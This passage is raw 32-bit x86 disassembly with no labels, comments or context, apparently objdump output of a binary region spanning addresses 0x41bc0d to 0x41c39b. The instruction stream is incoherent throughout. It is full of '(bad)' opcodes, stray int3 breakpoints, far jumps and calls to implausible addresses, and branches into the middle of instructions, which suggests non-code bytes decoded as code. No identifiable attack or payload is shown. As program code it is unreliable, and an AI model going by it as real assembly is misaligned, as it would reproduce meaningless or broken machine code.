  41bc0d:	(bad)  
  41bc0e:	in     eax,dx
  41bc0f:	int3   
  41bc10:	dec    esp
  41bc12:	and    eax,DWORD PTR [ebx-0x7aefff3b]
  41bc18:	or     ecx,esp
  41bc1a:	jmp    0x49cabd1c
  41bc1f:	(bad)  
  41bc20:	(bad)  
  41bc21:	(bad)  
  41bc22:	(bad)  
  41bc24:	xchg   esi,eax
  41bc25:	jmp    DWORD PTR [esi-0x65]
  41bc28:	and    DWORD PTR [eax],eax
  41bc2a:	push   cs
  41bc2b:	sbb    eax,0x8901ff83
  41bc30:	add    DWORD PTR [eax],0x44
  41bc33:	jmp    DWORD PTR [esi-0x1]
  41bc36:	or     eax,DWORD PTR [esp+ebp*2-0x1]
  41bc3a:	xor    dl,al
  41bc3c:	add    bh,bh
  41bc3e:	xchg   ecx,eax
  41bc3f:	add    DWORD PTR [eax],0xffffffcc
  41bc42:	add    BYTE PTR ds:[ebp+0x0],cl
  41bc46:	mov    bl,BYTE PTR [ecx+ebp*1]
  41bc49:	call   FWORD PTR [ecx-0x34]
  41bc4c:	add    BYTE PTR [eax],al
  41bc4e:	push   esp
  41bc4f:	add    bh,bh
  41bc51:	add    BYTE PTR [ecx+ecx*4-0x34],dl
  41bc55:	call   DWORD PTR [edx]
  41bc57:	jb     0x41bc90
  41bc59:	cmp    DWORD PTR [eax-0x6a00007f],0xffffffff
  41bc60:	mov    edi,edi
  41bc62:	push   ebx
  41bc63:	jmp    DWORD PTR [esi]
  41bc65:	add    BYTE PTR [ebx+0x73],bl
  41bc68:	iret   
  41bc69:	add    BYTE PTR [edx-0x21],ch
  41bc6c:	inc    DWORD PTR [ebx-0xffffac]
  41bc72:	jge    0x41bc73
  41bc74:	jns    0x41bc76
  41bc76:	cdq    
  41bc77:	and    al,0xd4
  41bc79:	inc    esi
  41bc7b:	je     0x41bc7c
  41bc7d:	dec    DWORD PTR [edi-0x1]
  41bc80:	(bad)  
  41bc81:	push   DWORD PTR [esi]
  41bc83:	sbb    DWORD PTR [ecx+0x355797ff],0xffffffff
  41bc8a:	sbb    cl,bl
  41bc8c:	add    BYTE PTR [eax],al
  41bc8e:	in     al,0xff
  41bc90:	cdq    
  41bc91:	inc    DWORD PTR [eax]
  41bc93:	fld    DWORD PTR ds:0x4a83ff07
  41bc99:	add    bh,bh
  41bc9b:	pop    ds
  41bc9c:	pop    bp
  41bc9e:	or     DWORD PTR [ecx+0x358900f4],0xffffffa2
  41bca5:	sub    al,0x83
  41bca7:	inc    DWORD PTR [ebp-0x1]
  41bcaa:	add    BYTE PTR [ebx-0x76008edd],dh
  41bcb0:	jae    0x41bc35
  41bcb2:	jmp    FWORD PTR [eax]
  41bcb4:	stos   DWORD PTR es:[edi],eax
  41bcb5:	pop    ss
  41bcb6:	add    ah,cl
  41bcb8:	fld    DWORD PTR [ebx-0x48590800]
  41bcbe:	mov    edi,edi
  41bcc0:	dec    esi
  41bcc1:	inc    DWORD PTR [ebx-0xb10560]
  41bcc7:	add    BYTE PTR [ecx],al
  41bcc9:	cmp    edi,0xfffffffa
  41bccc:	xlat   BYTE PTR ds:[ebx]
  41bccd:	push   ebx
  41bcce:	int3   
  41bccf:	add    BYTE PTR [ebx],ah
  41bcd1:	inc    DWORD PTR [eax]
  41bcd3:	jne    0x41bc65
  41bcd5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bcd6:	(bad)  
  41bcd7:	jmp    FWORD PTR [eax]
  41bcd9:	mov    esp,ecx
  41bcdb:	fsubrp st(1),st
  41bcdd:	aad    0xcc
  41bcdf:	add    DWORD PTR [eax],0xffffff89
  41bce2:	add    BYTE PTR [esi-0x7c00f05b],dh
  41bce8:	inc    ebp
  41bce9:	mov    DWORD PTR [eax],eax
  41bceb:	loop   0x41bce7
  41bced:	xor    bh,bh
  41bcef:	add    ch,dh
  41bcf1:	add    BYTE PTR [ebx-0x7608e901],al
  41bcf7:	call   esp
  41bcf9:	add    BYTE PTR [eax],al
  41bcfb:	inc    ecx
  41bcfc:	es inc eax
  41bcfe:	add    bh,bh
  41bd00:	in     al,0x83
  41bd02:	(bad)  
  41bd03:	out    dx,al
  41bd04:	sbb    BYTE PTR [eax],bl
  41bd06:	int3   
  41bd07:	sbb    ebx,0xffffffff
  41bd0a:	inc    DWORD PTR [ebp+0xd0f6]
  41bd10:	in     eax,0x83
  41bd12:	inc    DWORD PTR [ebx+0xff1621]
  41bd18:	sub    edi,edi
  41bd1a:	int3   
  41bd1b:	cmp    esp,esi
  41bd1d:	test   DWORD PTR [eax],eax
  41bd1f:	jmp    DWORD PTR [edi-0x6a210077]
  41bd25:	cmp    edi,0x83005989
  41bd2b:	imul   ebp,edi,0xe6ff89f9
  41bd31:	dec    DWORD PTR [ecx-0xffae2b]
  41bd37:	add    BYTE PTR [esi-0x1],ch
  41bd3a:	add    ah,dh
  41bd3c:	mov    esi,0xf8ffffb3
  41bd41:	add    bh,bh
  41bd43:	ror    DWORD PTR [eax-0x4a],1
  41bd46:	inc    DWORD PTR [ebx+0x6100005e]
  41bd4c:	into   
  41bd4d:	mov    ebx,0x1d83ff
  41bd52:	call   DWORD PTR [edx+0x13]
  41bd55:	mov    DWORD PTR cs:[ebx+0x3383ffd6],eax
  41bd5c:	repz retf 0xff00
  41bd60:	leave  
  41bd61:	(bad)  
  41bd62:	inc    DWORD PTR [ebp+0x30]
  41bd65:	leave  
  41bd66:	(bad)  
  41bd67:	dec    DWORD PTR ds:0x2915ff00
  41bd6d:	mov    dh,0xff
  41bd6f:	add    BYTE PTR [eax+0x2d11ffff],ch
  41bd75:	sub    ecx,esp
  41bd77:	add    cl,dh
  41bd79:	int3   
  41bd7a:	add    BYTE PTR [ecx+0x83c78f],ah
  41bd80:	mov    edx,0x25e58300
  41bd85:	xchg   ebp,eax
  41bd86:	inc    DWORD PTR [ebx-0x68000068]
  41bd8c:	xor    edi,esi
  41bd8e:	(bad)  
  41bd8f:	push   DWORD PTR [edi+0x0]
  41bd92:	add    BYTE PTR [esi-0x14],dl
  41bd95:	xchg   ecx,eax
  41bd96:	add    BYTE PTR [eax],al
  41bd98:	ins    DWORD PTR es:[edi],dx
  41bd99:	add    bh,bh
  41bd9b:	test   al,0x2b
  41bd9d:	and    BYTE PTR [eax],al
  41bd9f:	inc    DWORD PTR [eax+eax*1]
  41bda2:	cmp    DWORD PTR [edi-0x9],0xffffffd1
  41bda6:	(bad)  
  41bda7:	(bad)  
  41bda8:	mov    ecx,0x2e2cff00
  41bdad:	push   eax
  41bdae:	int3   
  41bdaf:	push   ebx
  41bdb1:	int3   
  41bdb2:	and    DWORD PTR [edi-0x33b4d1],0xffffffde
  41bdb9:	(bad)  
  41bdba:	inc    DWORD PTR [esi+esi*8-0x12]
  41bdbe:	add    ah,cl
  41bdc0:	retf   0xff83
  41bdc3:	add    al,0x64
  41bdc5:	jmp    0x8400:0xdc0000
  41bdcc:	mov    dl,0x1a
  41bdce:	dec    esp
  41bdd0:	fmul   st(4),st
  41bdd2:	push   DWORD PTR ds:0x89888c
  41bdd8:	jp     0x41bdda
  41bdda:	int3   
  41bddb:	pop    edx
  41bddc:	mov    dl,0xc5
  41bdde:	int3   
  41bddf:	inc    DWORD PTR [edx]
  41bde1:	(bad)  
  41bde2:	dec    DWORD PTR [ecx-0x3300a83f]
  41bde8:	dec    ebx
  41bde9:	add    bh,bh
  41bdeb:	sub    al,0xf6
  41bded:	xor    al,0xcc
  41bdef:	add    bl,bh
  41bdf1:	(bad)  
  41bdf2:	(bad)  
  41bdf3:	mov    edx,0xffff0add
  41bdf8:	hlt    
  41bdf9:	inc    DWORD PTR [eax]
  41bdfb:	fbld   TBYTE PTR [eax]
  41bdfd:	mov    BYTE PTR [ebx+0xffbeff],0xf4
  41be04:	hlt    
  41be05:	pop    es
  41be06:	(bad)  
  41be07:	call   DWORD PTR [eax+eax*1-0xfb63301]
  41be0e:	inc    DWORD PTR [eax]
  41be10:	pop    es
  41be11:	add    DWORD PTR [eax],0x8
  41be14:	xor    al,0xd8
  41be16:	add    bh,bh
  41be18:	mov    al,ds:0x904fff00
  41be1d:	xchg   ebp,eax
  41be1e:	dec    DWORD PTR [ecx-0x367c0064]
  41be24:	pop    ds
  41be25:	mov    al,0x0
  41be27:	dec    ebp
  41be29:	add    bh,bh
  41be2b:	inc    edi
  41be2c:	jg     0x41be68
  41be2e:	inc    DWORD PTR [eax]
  41be30:	pushf  
  41be31:	inc    DWORD PTR [eax]
  41be33:	or     DWORD PTR [edx],0x13
  41be36:	inc    DWORD PTR [eax]
  41be38:	mov    bh,bh
  41be3a:	add    BYTE PTR [edx-0x8ea6],bh
  41be40:	inc    esi
  41be41:	(bad)  
  41be42:	jmp    ebp
  41be44:	adc    bl,dl
  41be46:	mov    edi,edi
  41be48:	in     eax,0xff
  41be4a:	dec    DWORD PTR [ebx+0x61]
  41be4d:	outs   dx,DWORD PTR ds:[esi]
  41be4e:	int3   
  41be4f:	add    BYTE PTR [edi+0x0],bl
  41be52:	call   DWORD PTR [ebx-0xff0a87]
  41be58:	jmp    0x71e4bd5d
  41be5d:	(bad)  
  41be5f:	inc    DWORD PTR [ebx-0x1]
  41be62:	jmp    FWORD PTR [esi+ebx*4]
  41be65:	sub    al,0x0
  41be67:	add    BYTE PTR [edi],ah
  41be69:	(bad)  
  41be6a:	(bad)  
  41be6b:	cmp    edi,edx
  41be6d:	das    
  41be6e:	inc    DWORD PTR [eax]
  41be70:	out    0xff,eax
  41be72:	jmp    FWORD PTR [ebp+eiz*2+0x7283ff4a]
  41be79:	(bad)  
  41be7a:	(bad)  
  41be7b:	fincstp 
  41be7d:	pop    ebp
  41be7e:	cmp    edi,0x38
  41be81:	dec    DWORD PTR [ecx-0x7c312c4d]
  41be87:	add    BYTE PTR [ecx+0x6ee60089],dl
  41be8d:	push   0xffffffff
  41be8f:	(bad)  
  41be90:	inc    DWORD PTR [ebx-0x439bc00]
  41be96:	dec    esp
  41be98:	inc    esi
  41be99:	inc    DWORD PTR [eax]
  41be9b:	push   0xccb8d2
  41bea0:	hlt    
  41bea1:	(bad)  
  41bea2:	jmp    FWORD PTR [edx-0xffc2b0]
  41bea8:	in     eax,dx
  41bea9:	add    BYTE PTR [eax],al
  41beab:	ins    DWORD PTR es:[edi],dx
  41beac:	fisubr WORD PTR [eax+eax*1+0x0]
  41beb0:	rol    BYTE PTR [ebx+0x3fac7d00],0x83
  41beb7:	dec    DWORD PTR [ebx+0x0]
  41beba:	jmp    edx
  41bebc:	test   al,0x49
  41bebe:	cmp    edi,0x2a
  41bec1:	inc    DWORD PTR [eax]
  41bec3:	clc    
  41bec4:	inc    esi
  41bec5:	fcmove st,st(4)
  41bec7:	add    BYTE PTR [ebx-0x77],dl
  41beca:	add    BYTE PTR [eax],dh
  41becc:	or     al,0x69
  41bece:	add    bh,bh
  41bed0:	adc    al,BYTE PTR [eax]
  41bed2:	add    BYTE PTR ds:0xffff6b57,bh
  41bed8:	pop    ebx
  41bed9:	add    DWORD PTR [eax],0xffffffa6
  41bedc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bedd:	out    dx,al
  41bede:	mov    edi,edi
  41bee0:	sahf   
  41bee1:	dec    DWORD PTR [ecx+0xbc3093]
  41bee7:	add    BYTE PTR [ebx-0x3195007d],dh
  41beed:	xor    edi,edi
  41beef:	xor    DWORD PTR [ebx-0x34],0xffffff89
  41bef3:	add    al,al
  41bef5:	cmp    ecx,esp
  41bef7:	jmp    FWORD PTR [esi]
  41bef9:	inc    DWORD PTR [eax]
  41befb:	pop    edx
  41befc:	(bad)  
  41befd:	fwait
  41befe:	int3   
  41beff:	call   FWORD PTR [eax+0x3eb9ffff]
  41bf05:	(bad)  
  41bf06:	(bad)  
  41bf07:	call   DWORD PTR [edi]
  41bf09:	inc    DWORD PTR [eax]
  41bf0b:	mov    eax,0xfffc6d
  41bf10:	dec    edi
  41bf11:	add    BYTE PTR [ebx-0x429210],al
  41bf17:	add    BYTE PTR [eax+0x0],bl
  41bf1a:	call   FWORD PTR [eax]
  41bf1c:	fs test al,0xff
  41bf1f:	inc    DWORD PTR [edi+0x4ce98300]
  41bf25:	mov    DWORD PTR [ebx-0x33ffad00],0xffeb1eda
  41bf2f:	add    BYTE PTR [ecx],cl
  41bf31:	(bad)  
  41bf32:	push   ebp
  41bf34:	add    eax,0x67ff83c8
  41bf39:	add    BYTE PTR [eax],al
  41bf3b:	push   ebx
  41bf3c:	push   edi
  41bf3d:	and    BYTE PTR [ebx-0x8b7d],al
  41bf43:	pop    bp
  41bf45:	push   ecx
  41bf46:	int3   
  41bf47:	add    BYTE PTR [eax+eax*1],cl
  41bf4a:	add    cl,ch
  41bf4c:	out    0x4a,eax
  41bf4e:	(bad)  
  41bf4f:	(bad)  
  41bf50:	cmp    DWORD PTR [ebx-0x4857af34],eax
  41bf56:	dec    esp
  41bf58:	and    DWORD PTR [eax],eax
  41bf5a:	dec    DWORD PTR ds:0xff891b82
  41bf60:	das    
  41bf61:	inc    DWORD PTR [eax]
  41bf63:	xor    al,0xf4
  41bf65:	push   0xffffff83
  41bf67:	adc    DWORD PTR [edx-0x1],0xffffff89
  41bf6b:	lahf   
  41bf6c:	fdiv   QWORD PTR [esp+ecx*8+0xff34cc]
  41bf73:	mov    bl,0x3e
  41bf75:	arpl   sp,cx
  41bf77:	add    BYTE PTR [esi],ch
  41bf79:	(bad)  
  41bf7a:	call   DWORD PTR [ecx]
  41bf7c:	repnz xor cl,BYTE PTR [ecx+0xedcc]
  41bf83:	fist   DWORD PTR [edx+edx*8-0x1]
  41bf87:	call   DWORD PTR [edx]
  41bf89:	inc    DWORD PTR [eax]
  41bf8b:	lods   al,BYTE PTR ds:[esi]
  41bf8c:	cld    
  41bf8d:	(bad)  
  41bf8e:	inc    DWORD PTR [eax]
  41bf90:	das    
  41bf91:	int3   
  41bf92:	inc    DWORD PTR [ebx+0xff1cf1]
  41bf98:	dec    edi
  41bf99:	cmp    edi,0x43
  41bf9c:	cmp    al,0x7
  41bf9e:	inc    DWORD PTR [eax]
  41bfa0:	jne    0x41bfa1
  41bfa2:	int3   
  41bfa3:	dec    eax
  41bfa4:	pop    ecx
  41bfa5:	into   
  41bfa6:	add    bh,bh
  41bfa8:	lahf   
  41bfa9:	(bad)  
  41bfaa:	push   DWORD PTR [edx+0xff96b8]
  41bfb0:	and    al,0xcc
  41bfb2:	call   FWORD PTR [edx]
  41bfb4:	enter  0x98,0xff
  41bfb8:	and    bh,bh
  41bfba:	int3   
  41bfbb:	pop    edi
  41bfbc:	or     al,0x46
  41bfbe:	add    DWORD PTR [ebx-0x480000fe],0xffffffc2
  41bfc5:	mov    ebp,0xff6783ff
  41bfca:	dec    DWORD PTR [edx-0xb]
  41bfcd:	mov    edi,edi
  41bfcf:	add    ch,ah
  41bfd1:	add    bh,bh
  41bfd3:	ja     0x41bfcd
  41bfd5:	sbb    eax,0xff86cc00
  41bfda:	add    BYTE PTR [esp+edi*1],al
  41bfdd:	mov    esp,0xcc7a0089
  41bfe2:	int3   
  41bfe3:	sub    eax,0x800
  41bfe8:	std    
  41bfe9:	mov    DWORD PTR [ebx+0xf5b18e],eax
  41bfef:	add    BYTE PTR [edx],dh
  41bff1:	add    BYTE PTR [ebx-0x549191],al
  41bff7:	inc    DWORD PTR [eax-0x77]
  41bffa:	int3   
  41bffb:	dec    eax
  41bffc:	mov    bh,0xe
  41bffe:	mov    DWORD PTR [eax],eax
  41c000:	adc    al,0xff
  41c002:	(bad)  
  41c003:	fst    DWORD PTR [eax]
  41c005:	add    al,0x0
  41c007:	dec    DWORD PTR [ecx-0x36a10077]
  41c00d:	cli    
  41c00e:	cmp    edi,0xffffffd2
  41c011:	int3   
  41c012:	inc    ebx
  41c014:	stos   BYTE PTR es:[edi],al
  41c015:	push   ebx
  41c016:	(bad)  
  41c017:	(bad)  
  41c018:	std    
  41c019:	add    BYTE PTR [eax],al
  41c01b:	dec    eax
  41c01c:	or     BYTE PTR [ecx],0x0
  41c01f:	add    BYTE PTR [ebp-0x77],bh
  41c022:	and    DWORD PTR [ebx+0xcc846f],0x14
  41c029:	(bad)  
  41c02a:	inc    esi
  41c02c:	xchg   edi,eax
  41c02d:	in     al,0xff
  41c02f:	(bad)  
  41c030:	aas    
  41c031:	add    BYTE PTR [eax],al
  41c033:	int    0xa2
  41c035:	sar    edi,1
  41c037:	call   FWORD PTR [ecx]
  41c039:	mov    DWORD PTR [ecx-0x3351aa0b],ecx
  41c03f:	adc    eax,0xffffff83
  41c042:	dec    ebx
  41c044:	xor    al,0x8f
  41c046:	(bad)  
  41c047:	call   ebx
  41c049:	add    ah,cl
  41c04b:	and    eax,0xccff43cd
  41c050:	add    edi,edi
  41c052:	add    BYTE PTR [ebx],al
  41c054:	or     edx,eax
  41c056:	add    BYTE PTR [eax],al
  41c058:	dec    ebp
  41c059:	inc    DWORD PTR [eax]
  41c05b:	adc    esi,edx
  41c05d:	lds    eax,FWORD PTR [ebx-0x1500]
  41c063:	inc    ebp
  41c064:	les    ebp,FWORD PTR [edx-0x7d]
  41c067:	add    BYTE PTR [ecx],dh
  41c069:	add    DWORD PTR [ebx-0x768c30c8],0xffffffff
  41c070:	cli    
  41c071:	inc    DWORD PTR [eax]
  41c073:	jge    0x41c0a1
  41c075:	retf   
  41c076:	int3   
  41c077:	jmp    FWORD PTR [edi]
  41c079:	add    bh,bh
  41c07b:	xor    DWORD PTR [ecx+0xa],eax
  41c07e:	inc    DWORD PTR [eax]
  41c080:	repnz mov DWORD PTR [ebx-0x96e90d],eax
  41c087:	call   FWORD PTR [ecx-0x1]
  41c08a:	add    BYTE PTR [edi+0x21],al
  41c08d:	dec    edx
  41c08e:	cmp    edi,0xffffffe7
  41c091:	add    BYTE PTR [eax],al
  41c093:	pop    ebx
  41c094:	sbb    dl,BYTE PTR [ecx+0x0]
  41c097:	add    dh,dh
  41c099:	add    BYTE PTR [ebx-0x1271c8],al
  41c09f:	jmp    DWORD PTR [ecx]
  41c0a1:	add    BYTE PTR [eax],al
  41c0a3:	mov    esi,0x83ff41e0
  41c0a8:	or     DWORD PTR [ecx-0x57930a00],ecx
  41c0ae:	add    BYTE PTR [ebx-0x477cff3f],al
  41c0b4:	pop    ebx
  41c0b5:	pop    ecx
  41c0b6:	(bad)  
  41c0b7:	(bad)  
  41c0b8:	sti    
  41c0b9:	(bad)  
  41c0ba:	jmp    DWORD PTR [ebx-0x28d9]
  41c0c0:	inc    edi
  41c0c1:	int3   
  41c0c2:	dec    DWORD PTR [ebx*1+0x1b89ffad]
  41c0c9:	int3   
  41c0ca:	(bad)  
  41c0cb:	fdivrp st(2),st
  41c0cd:	cmp    eax,0xff7eccff
  41c0d2:	xor    DWORD PTR [edx+esi*1+0x59],0xffffffcc
  41c0d7:	sub    DWORD PTR [ecx],0xffffffff
  41c0da:	add    BYTE PTR [ebx-0x8],dh
  41c0dd:	jno    0x41c0de
  41c0df:	jmp    DWORD PTR [ebx+0x37d0ff83]
  41c0e5:	jbe    0x41c0e6
  41c0e7:	dec    DWORD PTR [ebx+0x502bcc00]
  41c0ed:	add    eax,0xff848389
  41c0f2:	add    BYTE PTR [edi-0xa3e9],bh
  41c0f8:	pop    ds
  41c0f9:	(bad)  
  41c0fa:	inc    edx
  41c0fc:	xchg   BYTE PTR [ecx-0x7cd20001],dl
  41c102:	cmp    DWORD PTR [ecx],0x53
  41c105:	inc    esi
  41c106:	add    BYTE PTR [eax],al
  41c108:	mov    WORD PTR [ebx-0x6b6a9134],es
  41c10e:	inc    DWORD PTR [eax]
  41c110:	pop    edx
  41c111:	add    bh,bh
  41c113:	into   
  41c114:	stos   BYTE PTR es:[edi],al
  41c115:	ds add bh,bh
  41c118:	pop    eax
  41c119:	add    BYTE PTR [ebx-0x761fb623],al
  41c11f:	inc    DWORD PTR [ebp-0x1]
  41c122:	add    ah,dl
  41c124:	cli    
  41c125:	out    dx,al
  41c126:	inc    DWORD PTR [eax]
  41c128:	mov    WORD PTR [eax],es
  41c12a:	add    DWORD PTR [ecx],0xffffffc3
  41c12d:	push   ecx
  41c12e:	or     esp,0xffffffc9
  41c131:	add    BYTE PTR [ecx-0x7c06dd00],cl
  41c137:	call   FWORD PTR [ebx-0x1]
  41c13a:	call   FWORD PTR [ebp-0x2d]
  41c13d:	outs   dx,DWORD PTR ds:[esi]
  41c13e:	int3   
  41c13f:	mov    DWORD PTR [esi-0x77],esi
  41c142:	add    DWORD PTR [edi-0x76ff6db6],0xffffffba
  41c149:	add    bh,bh
  41c14b:	or     BYTE PTR [eax],al
  41c14d:	ds int3 
  41c14f:	call   ebx
  41c151:	add    BYTE PTR [eax],al
  41c153:	jbe    0x41c1d4
  41c155:	cmp    bh,0xff
  41c158:	dec    ebp
  41c159:	add    BYTE PTR [ecx+0xd7fa67],cl
  41c15f:	add    al,ch
  41c161:	int3   
  41c162:	jmp    FWORD PTR [edi]
  41c164:	ja     0x41c0f1
  41c166:	add    bh,bh
  41c168:	call   0xe810c06d
  41c16d:	mov    dl,0x83
  41c16f:	add    BYTE PTR [ebp-0x51430000],bl
  41c175:	fs int3 
  41c177:	call   FWORD PTR [ebx]
  41c179:	add    bh,bh
  41c17b:	stos   DWORD PTR es:[edi],eax
  41c17c:	in     al,dx
  41c17d:	scas   al,BYTE PTR es:[edi]
  41c17e:	(bad)  
  41c17f:	dec    DWORD PTR [esi-0x7d]
  41c182:	add    BYTE PTR [ecx+0xff24e1],cl
  41c188:	(bad)  
  41c189:	mov    edi,edi
  41c18b:	je     0x41c1d5
  41c18d:	mov    al,ds:0xff84ff00
  41c192:	call   FWORD PTR [esi-0x5b]
  41c195:	stc    
  41c196:	(bad)  
  41c197:	call   FWORD PTR [ebp-0x63787c01]
  41c19d:	rol    DWORD PTR [ebx-0x7c00ed00],1
  41c1a3:	clc    
  41c1a4:	dec    eax
  41c1a5:	dec    edi
  41c1a6:	(bad)  
  41c1a7:	(bad)  
  41c1a8:	mov    ebx,0x645f0000
  41c1ad:	push   edi
  41c1ae:	(bad)  
  41c1af:	dec    DWORD PTR [ebx]
  41c1b1:	(bad)  
  41c1b2:	inc    edx
  41c1b4:	dec    ebx
  41c1b5:	dec    eax
  41c1b6:	add    bh,bh
  41c1b8:	mov    ds:0xc38eff83,eax
  41c1bd:	push   ds
  41c1be:	inc    DWORD PTR [eax]
  41c1c0:	mov    ebx,0x6a6fcc83
  41c1c5:	inc    edx
  41c1c6:	add    BYTE PTR [eax],al
  41c1c8:	fiadd  DWORD PTR [eax]
  41c1ca:	dec    DWORD PTR [edi-0x6c]
  41c1cd:	in     al,0x0
  41c1cf:	jmp    DWORD PTR [edi+0x3fe800ff]
  41c1d5:	and    eax,0x833fccff
  41c1da:	add    BYTE PTR [esi],bh
  41c1dc:	xor    BYTE PTR [edx+0x0],0xff
  41c1e0:	add    al,0x0
  41c1e2:	and    DWORD PTR [eax+0x3a],0xffffffc5
  41c1e6:	(bad)  
  41c1e7:	jmp    FWORD PTR [ecx-0x3166ff01]
  41c1ed:	push   esi
  41c1ee:	inc    DWORD PTR [eax]
  41c1f0:	pop    ebx
  41c1f1:	add    bh,bh
  41c1f3:	je     0x41c1dd
  41c1f5:	icebp  
  41c1f6:	add    BYTE PTR [ecx-0xf337615],cl
  41c1fc:	jnp    0x41c1de
  41c1fe:	add    DWORD PTR [eax],0xffffffea
  41c201:	inc    DWORD PTR [eax]
  41c203:	dec    eax
  41c204:	push   ebx
  41c205:	xchg   ebp,eax
  41c206:	inc    DWORD PTR [ebx+0x7b830064]
  41c20c:	xchg   esi,eax
  41c20d:	ud0    edi,edi
  41c210:	mov    cl,0x0
  41c212:	mov    DWORD PTR [esi-0xff323a],esi
  41c218:	jecxz  0x41c219
  41c21a:	add    bl,ch
  41c21c:	pusha  
  41c21d:	cmp    edi,0x0
  41c220:	or     DWORD PTR [eax],eax
  41c222:	sbb    DWORD PTR [ecx+esi*2-0x2900ff9d],0xffffff89
  41c22a:	cmp    DWORD PTR [ecx+0x25],0xffffffcb
  41c22e:	inc    DWORD PTR [ebx-0x400000e0]
  41c234:	pushw  cs
  41c236:	cmp    edi,0x52
  41c239:	add    bh,bh
  41c23b:	and    eax,0x4856
  41c240:	je     0x41c241
  41c242:	add    BYTE PTR [esi],bh
  41c244:	lahf   
  41c245:	adc    edi,edi
  41c247:	jmp    DWORD PTR [ebx-0x5c4a7700]
  41c24d:	mov    al,ds:0xff5b83ff
  41c252:	add    BYTE PTR [esi],ah
  41c254:	xchg   ebx,eax
  41c255:	mov    bh,bh
  41c257:	add    BYTE PTR [edx],al
  41c259:	add    DWORD PTR [eax],0xffffff98
  41c25c:	mov    DWORD PTR [ebx-0x910077],edi
  41c262:	add    BYTE PTR [eax],bl
  41c264:	sar    BYTE PTR ds:0xff73ffff,cl
  41c26a:	adc    ecx,0xffffffe3
  41c26d:	push   ebx
  41c26e:	inc    DWORD PTR [eax]
  41c270:	jmp    0x41c271
  41c272:	mov    DWORD PTR [eax-0x36],eax
  41c275:	dec    esi
  41c276:	inc    DWORD PTR [ebx+0x79ffffa7]
  41c27c:	sti    
  41c27d:	xor    eax,DWORD PTR [eax]
  41c27f:	mov    edx,ebx
  41c281:	(bad)  
  41c282:	jmp    DWORD PTR [edi+0x14]
  41c285:	mov    edx,0x89bacc00
  41c28a:	jmp    FWORD PTR [edi-0x30]
  41c28d:	dec    ecx
  41c28e:	(bad)  
  41c28f:	inc    DWORD PTR [esi-0x4b00ff01]
  41c295:	mov    es,WORD PTR [ebx-0xffc700]
  41c29b:	cmp    edx,eax
  41c29d:	(bad)  
  41c29f:	add    ah,dh
  41c2a1:	add    DWORD PTR [ebx-0x6d8520],0xffffffff
  41c2a8:	ins    DWORD PTR es:[edi],dx
  41c2a9:	(bad)  
  41c2aa:	dec    DWORD PTR [edx+0xffc856]
  41c2b0:	add    ecx,esp
  41c2b2:	add    ch,bl
  41c2b4:	aad    0x85
  41c2b6:	add    DWORD PTR [ebx-0x3c76005e],0xffffffa0
  41c2bd:	sub    edi,edi
  41c2bf:	add    BYTE PTR [esi],al
  41c2c1:	mov    DWORD PTR [ebx-0x551f09],eax
  41c2c7:	add    BYTE PTR [ecx],bl
  41c2c9:	add    BYTE PTR [ebx-0x77aa8e],al
  41c2cf:	add    BYTE PTR [eax+0x3898ffff],bh
  41c2d5:	and    DWORD PTR [eax],eax
  41c2d7:	inc    DWORD PTR [edi-0x34]
  41c2da:	add    bl,ah
  41c2dc:	loop   0x41c2fc
  41c2de:	(bad)  
  41c2df:	call   DWORD PTR [edx+0x704bffff]
  41c2e5:	les    eax,FWORD PTR [ebx-0xffe101]
  41c2eb:	sar    DWORD PTR [eax-0x4100fff4],cl
  41c2f1:	add    DWORD PTR [ebx+0xde3fb6],0xffffffff
  41c2f8:	pop    eax
  41c2f9:	add    BYTE PTR [eax],al
  41c2fb:	add    esi,edx
  41c2fd:	(bad)  
  41c2fe:	dec    esp
  41c300:	stc    
  41c301:	inc    DWORD PTR [eax]
  41c303:	(bad)  
  41c304:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c305:	inc    ecx
  41c306:	add    BYTE PTR [eax],al
  41c308:	xchg   esi,eax
  41c309:	inc    DWORD PTR [eax]
  41c30b:	adc    al,0xc5
  41c30d:	int    0x0
  41c30f:	add    BYTE PTR [edx],al
  41c311:	inc    DWORD PTR [eax]
  41c313:	outs   dx,DWORD PTR ds:[esi]
  41c314:	rol    DWORD PTR [esi-0x1],0xff
  41c318:	sar    edi,cl
  41c31a:	jmp    DWORD PTR [eax-0x1f]
  41c31d:	ds cmp edi,0xffffffd3
  41c321:	add    DWORD PTR [eax],0x48
  41c324:	sub    BYTE PTR [ebx],bl
  41c326:	add    BYTE PTR [eax],al
  41c328:	pop    ss
  41c329:	dec    DWORD PTR [ecx-0x12d85f]
  41c32f:	inc    DWORD PTR [eax+eax*1-0x7d]
  41c333:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c334:	mov    dh,bh
  41c336:	inc    DWORD PTR [eax]
  41c338:	xchg   ecx,eax
  41c339:	add    bh,bh
  41c33b:	xchg   edx,eax
  41c33c:	out    dx,eax
  41c33d:	sbb    bh,bh
  41c33f:	jmp    DWORD PTR [ebx]
  41c341:	int3   
  41c342:	mov    DWORD PTR [ebp+0x2c],ebx
  41c345:	daa    
  41c346:	add    ah,cl
  41c348:	xor    al,BYTE PTR [ebx+0x4000e9cc]
  41c34e:	(bad)  
  41c34f:	push   DWORD PTR [ebx+eax*4]
  41c352:	inc    DWORD PTR [ebx+0x38]
  41c355:	mov    cl,ah
  41c357:	push   DWORD PTR [edi+edi*8]
  41c35a:	add    BYTE PTR [esi],bh
  41c35c:	in     eax,dx
  41c35d:	xor    DWORD PTR [ecx-0x4e01],ecx
  41c363:	inc    edi
  41c364:	pop    esi
  41c365:	clc    
  41c366:	mov    DWORD PTR [eax],eax
  41c368:	cmp    BYTE PTR [eax],al
  41c36a:	add    BYTE PTR [edi],ch
  41c36c:	jnp    0x41c33f
  41c36e:	int3   
  41c36f:	add    dl,ah
  41c371:	cmp    edi,0x5b
  41c374:	inc    esi
  41c375:	bound  eax,QWORD PTR [ebx-0x7cfffe00]
  41c37b:	cmp    eax,DWORD PTR [edi]
  41c37d:	call   0xffd3c381
  41c382:	call   FWORD PTR [edx+eax*4+0x2e00ff46]
  41c389:	(bad)  
  41c38a:	inc    esi
  41c38c:	loopne 0x41c3c9
  41c38e:	add    bh,bh
  41c390:	inc    esp
  41c391:	add    bh,bh
  41c393:	fild   DWORD PTR [edi]
  41c395:	sar    bh,1
  41c397:	mov    DWORD PTR [ecx],edx
  41c399:	add    bh,bh
  41c39b:	cmp    DWORD PTR [esi+esi*2],esp
